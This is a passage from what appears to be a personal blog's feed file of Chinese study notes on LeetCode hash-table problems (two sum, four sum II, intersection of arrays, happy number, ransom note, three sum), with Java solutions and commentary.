nownumber】<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110249454.png" alt="image-20241014110249454"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110319990.png" alt="image-20241014110319990"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110336307.png" alt="image-20241014110336307"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//创建最终输出的数组</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="comment">//排除特殊情况</span></span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建需要的Map</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(tmp)) &#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//获取key对应的value</span></span><br><span class="line">            map.put(nums[i],i);</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashmap.get(Object key)</span><br><span class="line"><span class="comment">//get方法获取指定key的value</span></span><br><span class="line">hashmap.put（K key，V value）</span><br><span class="line"><span class="comment">//将键值对添加到HashMap中</span></span><br></pre></td></tr></table></figure><h4 id="四数之和"><a href="#四数之和" class="headerlink" title="四数之和"></a>四数之和</h4><p>link：<a href="https://leetcode.cn/problems/4sum-ii/description/">454. 四数相加 II - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先看到四数加和，很容易想到两两分组遍历分别求和.利用map中key和value分别存储两个数组元素之和以及出现的次数（value）最后利用两两打足求和之后加法原则a+b（A）+ c+d（B）&#x3D; 0，0 - B &#x3D; A，如果A在map中出现过，就用定义的计数器count吧map中key对应的value统计出来最后返回count即可.【出现过几次就有几组】</p><h6 id="HashMap-1"><a href="#HashMap-1" class="headerlink" title="HashMap"></a>HashMap</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">       <span class="comment">//首先创建需要的Map</span></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//创建sum和res</span></span><br><span class="line">        <span class="type">int</span> sum,res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//求a、b(A)数组之和</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="comment">//如果tmp已经在map中存储过 value+1更新存储</span></span><br><span class="line">                <span class="comment">//put存储键值对 get获取value值</span></span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(sum)) &#123;</span><br><span class="line">                    map.put(sum,map.get(sum) + <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//第一次出现在map中value为1</span></span><br><span class="line">                    map.put(sum,<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//求c、d(B)两数组之和并根据逻辑公式检查A数组中是否存在对应数值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                sum = i + j;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(<span class="number">0</span> - sum)) &#123;</span><br><span class="line">                    res += map.get(<span class="number">0</span> - sum);</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="补充getOrDefault"><a href="#补充getOrDefault" class="headerlink" title="补充getOrDefault()"></a>补充getOrDefault()</h6><p>getOrDefault() 方法获取指定 key 对应对 value，如果找不到 key ，则返回设置的默认值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashmap.getOrDefault(Object key, V defaultValue)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j:nums2)</span><br><span class="line">            &#123;</span><br><span class="line">                sum = i+j;</span><br><span class="line">                map.put(sum,map.getOrDefault(sum,<span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums3)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j :nums4)</span><br><span class="line">            &#123;</span><br><span class="line">               sum = i + j;</span><br><span class="line">               res+=map.getOrDefault(<span class="number">0</span>-sum,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x8</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x8/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x8/</url>
      
        <content type="html"><![CDATA[<h3 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h3><p>link：<a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. 两个数组的交集 - 力扣（LeetCode）</a></p><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>首先想到合并两个数组，遍历找重复项存储到新的数组中但其实用HashSet是更加方便的,【HashSet不存在重复数据】</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241012004357257.png" alt="image-20241012004357257"><br>**注意：使用数组做哈希表的题目都限制了大小 例如只有小写字母或者数值大小在【0-1000】内 **</p><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建需要的set表 set2用于返回结果</span></span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历数组1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)  &#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历ser1映射的元素判断哈希表中是否存在对应元素</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i)) &#123;</span><br><span class="line">                set2.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将结果集合转换为数组</span></span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[set2.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : set2) &#123;</span><br><span class="line">            result[k++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>更高级的写法 Java8引入的流式API（Stream API）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//将结果集合转换为数组</span></span><br><span class="line"><span class="keyword">return</span> set2.stream().mapToInt(x -&gt; x).toArray();</span><br></pre></td></tr></table></figure><p>**<code>stream()</code>**：将集合转换为流对象，便于对集合进行链式操作.<br>**<code>mapToInt(x -&gt; x)</code>**：将流中的每个 <code>Integer</code> 元素转换为 <code>int</code> 类型（自动拆箱).<br>**<code>toArray()</code>**：将流中的元素收集为一个 <code>int[]</code> 数组.</p><h5 id="Hash数组"><a href="#Hash数组" class="headerlink" title="Hash数组"></a>Hash数组</h5><p>思路相同 只不过加了大小限制之后可以用Hash数组解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="comment">//创建需要的两个数组  </span></span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="comment">//分别遍历两个数组 对相同元素出现次数计数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//相同的下标位置都大于0 满足</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">            result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//转换成数组</span></span><br><span class="line">        <span class="type">int</span>[] finalArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : result) &#123;</span><br><span class="line">            finalArray[index++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalArray;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><h3 id="快乐数"><a href="#快乐数" class="headerlink" title="快乐数"></a>快乐数</h3><p>link：<a href="https://leetcode.cn/problems/happy-number/description/">202. 快乐数 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>起初分析的时候被卡在了循环条件处【😓】，首先得不是1然后不满足快乐数条件最后不被包含在Hashset中.【是的没错是高贵的Hashset（bushi）】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//创建所需的set表</span></span><br><span class="line">        Set&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//循环判断 按除每一位判断</span></span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span> &amp;&amp; !result.contains(n)) &#123;</span><br><span class="line">            result.add(n);</span><br><span class="line">            <span class="comment">//getNumber函数单独模拟实现</span></span><br><span class="line">            n = getNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//逐位进行平方求和判断</span></span><br><span class="line">            <span class="keyword">while</span>(n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">                res += tmp * tmp;</span><br><span class="line">                n = n / <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h6><p> <strong>所有由此观之，所有判断元素是否出现过的题目都可以用哈希法解决.</strong><br><strong>一般哈希表都是用来快速判断一个元素是否出现集合里.</strong></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xa</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xa/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xa/</url>
      
        <content type="html"><![CDATA[<h4 id="赎金信"><a href="#赎金信" class="headerlink" title="赎金信"></a>赎金信</h4><p>link：<a href="https://leetcode.cn/problems/ransom-note/description/">383. 赎金信 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>关键分析觉得是次数统计，ransomNote中的字符出现次数和magazine中统计次数相同即可.（有点相同字母异序词的味-&gt;哈希数组实现【大小写转换】）<br>题目又说是两个字符串全为小写字母，有数量限制（少量）.方便进行映射.<br>可以暴力两层for循环求解，但又想到先前接触的哈希map进行映射.</p><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a><strong>Tip</strong></h6><p>本题目使用map消耗的空间资源比数组大一些.map要维护红黑树或哈希表还要做哈希函数，更费时.【数据量大时更能体现】</p><h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConstruct</span><span class="params">(String ransomNote, String magazine)</span> &#123;</span><br><span class="line">        <span class="comment">//创建需要的数组和中间汴梁</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历rans 在magazine中映射确定 下标位置标记逐增</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; magazine.length(); i++) &#123;</span><br><span class="line">            tmp = magazine.charAt(i) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            arr[tmp]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在magazine中对应查找 找的的位置逐减</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ;i &lt; ransomNote.length(); i++) &#123;</span><br><span class="line">            tmp = ransomNote.charAt(i) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="comment">//注意情况判断</span></span><br><span class="line">            <span class="keyword">if</span>(arr[tmp] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                arr[tmp]--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h4><p>link：<a href="https://leetcode.cn/problems/3sum/description/">15. 三数之和 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>最先想的是两两分组，用数组做，然后又想到用哈希map映射，但是题目限制了去重，不是很好操作.<br>根据提供的示例发现只是三元组不能重复但是组内元素可以相同如[0,0,0].这种情况在去重的时候要考虑进去.避免对{-2，-2，4}这样的数据筛查遗漏.<br><strong>所以判断条件是</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] ==  nums[i - <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><strong>而不是</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[i] == nums[i + <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>用双指针进行判断【必须是数组排好序】，i在数组起始位置，left在i+1位置，right在数组末尾.i和right先不动，left依次向后遍历，如果三者相加大于0，right向前移动.三折相加小于0，left往后移动.</p><h6 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip"></a>Tip</h6><p>三数去重碰到相邻相同元素进行跳过，因为已经判断过一次没必要再判断一次，还要进行减枝避免超时.</p><h6 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//创建需要的有序列表</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">       <span class="comment">//进行遍历判断 全大于0不可能加和为0</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//去重a、b</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i -<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line"> <span class="comment">//双指针</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(right &gt; left) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">        <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.add(Arrays.asList(nums[i],nums[left],nums[right]));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去重b、c俩元素</span></span><br><span class="line">            <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>])&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//寻找新的三元组避免重复</span></span><br><span class="line">            right--;</span><br><span class="line">            left++;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xb</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xb/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xb/</url>
      
